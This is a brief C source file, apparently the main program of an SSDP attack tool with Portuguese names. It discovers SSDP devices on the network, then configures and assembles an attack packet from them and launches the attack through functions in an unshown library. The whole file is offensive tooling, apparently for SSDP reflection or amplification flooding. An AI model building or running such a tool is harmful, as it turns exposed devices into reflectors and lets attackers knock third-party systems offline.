#include "ssdp/ssdpLib.h"
 



int main (int argc, char** argv){

	listDispositivoSSDP* listaDispositivos;
	configuracaoAtaque* configuracao = NULL;
	pacoteAtaque* pckAttack = NULL;

	listaDispositivos = iniciaListDisp();

    printf("Modulo de pesquisa SSDP. \n");
	printf("------------------------------------------------\n");
    pesquisarDispositivosSSDP(listaDispositivos);
	printf("----------------------Fim Pesquisa-------------------\n");
	//mostrarDispositivosObtidos(listaDispositivos);

	/*----------------------------------------------------------------------*/
	printf("Modulo de ataque SSDP. \n");

	configuracao = configurarAttackSSDP(listaDispositivos);

	pckAttack = montaPacketAttackSSDP(configuracao);

	iniciaAtaqueSSDP(configuracao, pckAttack, 3);

	exit(0);
}

